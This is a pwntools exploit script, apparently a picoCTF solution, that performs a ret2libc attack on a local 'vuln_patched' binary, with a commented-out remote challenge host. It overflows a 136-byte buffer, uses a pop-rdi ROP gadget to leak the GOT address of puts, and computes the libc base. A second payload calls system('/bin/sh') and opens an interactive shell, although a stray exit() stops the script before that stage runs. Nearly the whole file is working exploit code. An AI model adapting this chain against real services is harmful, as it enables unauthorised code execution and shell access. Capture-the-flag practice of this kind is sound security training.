from pwn import *

p=process("./vuln_patched")
#p=remote("mercury.picoctf.net", 23584)

print(p.recvline()) # stdout: WeLcOmE To mY EcHo sErVeR!

elf=ELF("./vuln_patched")
libc=ELF("./libc.so.6")

payload=b"A"*136
payload+=p64(0x00400913) # pop rdi
payload+=p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])
payload+=p64(elf.symbols['main'])

p.sendline(payload)

print(p.recvline()) # e.g. stdout: BbBbBbBbBbBbBbBbBb when you input stdin: BBBBBBBBBBBBBBBBBB.
print(p.recvline()) # stdout: 0\xea"8\x12\x7f\n ... This includes address of got['puts']

#addr=u64(p.recvline().ljust(8,b"\x00")) .. This does not work.
addr=u64(p.recv(6).ljust(8,b"\x00"))  ##################################################################################################################################


libc_base=addr-libc.symbols['puts'] # libc.symbols['puts'] ... 0x80a30 from readelf
# libc_base: 0x6d4f63445b27


exit()

# print("/bin/sh")
# print(hex(next(libc.search(b"/bin/sh"))))
payload=b"A"*136
#payload+=p64(0x0040052e) # ret
payload+=p64(0x00400913) # pop rdi
payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
payload+=p64(0x0040052e) # ret, this also workes well. Align the stack to 16 bytes otherwise system() will crash
payload+=p64(libc_base+libc.symbols['system'])
p.sendline(payload)
p.interactive()